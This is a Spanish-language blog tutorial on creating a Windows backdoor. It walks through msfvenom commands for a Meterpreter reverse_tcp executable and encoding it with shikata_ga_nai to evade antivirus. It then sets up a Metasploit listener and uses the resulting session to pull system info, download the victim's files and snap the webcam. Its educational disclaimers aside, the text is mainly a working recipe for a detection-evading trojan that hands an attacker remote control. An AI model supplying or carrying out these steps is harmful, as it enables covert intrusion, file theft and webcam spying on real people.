---
layout: single
title:  Cómo crear un backdoor y su funcionamiento
excerpt: "En este post te enseñaré cómo crear un backdoor, técnicas básicas para esconderlo y el funcionamiento desde el punto de vista del atacante y de la víctima. Podrás ver cómo se accede a su webcam, archivos..."
date: 2021-05-30
classes: wide
header:
    teaser: /assets/images/crear-backdoor-como-funciona/portada.jpg
    teaser_home_page: true
categories:
    - Tutoriales
tags:
    - Tutoriales
    - Redes
    - Backdoors
    - msfvenom
---
<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/portada.jpg" width="80%">
</p>

**Aviso:** Este post se ha realizado únicamente con fines educativos. No me hago responsable de las acciones que puedan realizar terceras personas, fruto del conocimiento transmitido.
{: .notice--danger}

> **Backdoor**: Un backdoor (puerta trasera), es una secuencia dentro del código de programación de algún archivo o programa que permite otorgar el control del dispositivo utilizado al atacante. Cuando esta puerta trasera es escondida sobre un archivo o programa aparentemente legítimo, decimos que se trata de un troyano.

Actualmente crear un backdoor es bastante sencillo, pues existen diferentes herramientas que nos facilitan la tarea. La complejidad real viene a al momento de esconderlo y evitar que la víctima se de cuenta.

Veremos cómo crear ese backdoor mediante el uso de "msfvenom", cómo evadir algunos antivirus y qué se puede hacer una vez se haya comprometido el sistema de la víctima (podremos ver su webcam en tiempo real, sus archivos...).

NOTA: Todas las pruebas se han realizado en entornos controlados.

## Creación del backdoor
Para empezar con la creación del backdoor, abriremos una consola linux y buscaremos las diferentes opciones de **msfvenom** para ver qué nos permite hacer mediante el comando `msfvenom -h`

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/msfvenom.png" width="100%">
</p>

Como vemos, nos ofrece diferentes parámetros y opciones. A nosotros nos interesan los siguientes:
- "-p": Mediante este parámetro seleccionaremos la carga útil (el código malicioso) -> `windows/meterpreter/reverse_tcp`
- "lhost": Indicaremos nuestra IP, donde el programa establecerá conexión y así poder recibir y enviar información -> `<tu IP>`
- "lport": Indicaremos el puerto que queramos utilizar al momento de entablar la conexión -> `<el puerto que tú quieras>`
- "-f": Mediante este parámetro seleccionaremos el formato del programa malicioso -> `exe`
- "-o": Mediante este parámetro indicaremos la ruta de salida del programa creado -> `<la ruta que tú decidas>`

El comando final quedaría de la siguiente forma:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.*** lport=4444 -f exe -o /home/r4kso/Desktop/backdoor.exe
```

Como vemos, se nos ha creado el programa malicioso :

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/creacion-programa.png" width="100%">
</p>

Ahora, solo bastaría con hacer que el objetivo inicie el programa, pero nos encontramos con un problema... Y es que es muy sencillo de detectar por los antivirus, como demuestra la siguiente prueba:

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/prueba-virustotal.png" width="50%">
</p>

Casi todos los antivirus lo han detectado así que... ¿Qué podemos hacer? Pues bien, a parte de utilizar otros formatos y sistemas como las **macros de Suite de Office** para esconder nuestras backdoors, podemos usar algo llamado **encoders**. Tal y como su nombre indica, los *enconders* codifican el programa, haciéndolo más difícil de leer para los antivirus. No siempre funciona y es por ello que se requieren diferentes métodos. A continuación veremos cómo funciona un encoder.

## Usando encoders
msfvenom ofrece la posibilidad de usar un encoder en el momento de crear el programa malicioso. Existen diferentes encoders, uno de los más comúnes es "shikata_ga_nai". Para utilizarlo, debemos volver a crear el programa, esta vez con dos parámetros extras:
- "-e": Indica el encoder a utilizar -> `x86/shikata_ga_nai`
- "-i": El numero de iteraciones -> `5`

El número de iteraciones a utilizar indica la cantidad de veces que se codificará el programa, haciendo el programa cada vez menos legible con cada iteración. Se recomienda no iterar más de 5 veces, pues el antivirus lo puede detectar directamente como *malware*.

Bien, pues el comando final quedaría de la siguiente forma:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.*** lport=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /home/r4kso/Desktop/backdoor.exe
```

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/creacion-programa-codificado.png" width="100%">
</p>

Como se puede ver en consola, el programa se ha creado correctamente y esta vez codificado para tratar de *bypassear* al antivirus.

> Nota: Esto NO será suficiente para engañar al antivirus, se necesitan otros métodos para conseguirlo.

Ahora iniciaremos la **escucha** en el puerto que hayamos escogido para nuestro programa malicioso, sirviéndonos de Metasploit. Para ello, lo iniciaremos mediante el comando `msfconsole`, usaremos la utilidad `multi/handler`. Una vez dentro de esta utilidad indicaremos qué tipo de payload hemos utilizado mediante el comando `payload windows/meterpreter/reverse_tcp`. Después, indicaremos el host (`LHOST`) y el puerto (`LPORT`).

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/msfconsole.png" width="50%">
</p>

Ahora que estamos a la escucha, una vez se inicie el programa en el equipo correspondiente obtendremos acceso al sistema.

## Comprometiendo el sistema
Solo queda instalar el programa malicioso en el equipo correspondiente. Desactivo los antivirus e inicio el programa.

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/backdoor-en-pc.png" width="70%">
</p>

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/proteccion-windows.png" width="70%">
</p>

Como vemos, nos ha saltado una alerta de windows diciendo que el programa podría ser peligroso, **lo ejecutamos de todas formas** ¡y listo! Sistema comprometido. Desde el punto de vista de la víctima, no ha pasado absolutamente nada... Pero desde el punto de vista del atacante, hemos conseguido el acceso completo.

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/meterpreter-iniciado.png" width="100%">
</p>

Vamos a trastear un poco y ver qué podemos hacer...

## Fase de acción
Para obtener información sobre el sistema en el que estamos, usamos el comando `sysinfo`

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/sysinfo.png" width="60%">
</p>

Bien, como tenemos el control completo nos podemos mover entre los archivos. Para descargar un archivo, utilizaremos el comando `download <archivo>`. Descargaremos esta foto que se encuentra en la carpeta de Descargas

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/download.png" width="70%">
</p>

Hemos conseguido descargar en nuestro equipo la foto, qué bonitos :D

<p align="center">
<img src="/assets/images/crear-backdoor-como-funciona/gatitos.png" width="80%">
</p>

También podremos acceder a la webcam, mediante el comando `webcam_snap -c 1`. Esto no lo podré demostrar dado que no tengo webcam, pero pruébalo tú mismo.

Como vemos, se puede hacer cualquier cosa... A partir de aquí toca buscarse la vida: convertir la sesión meterpreter en una Shell, migración de procesos... Sé creativo ;)

Aviso: Realizar siempre en entornos controlados y con el consentimiendo de la persona. El incumplimiento de esto puede llevar a acciones legales.
{: .notice--danger}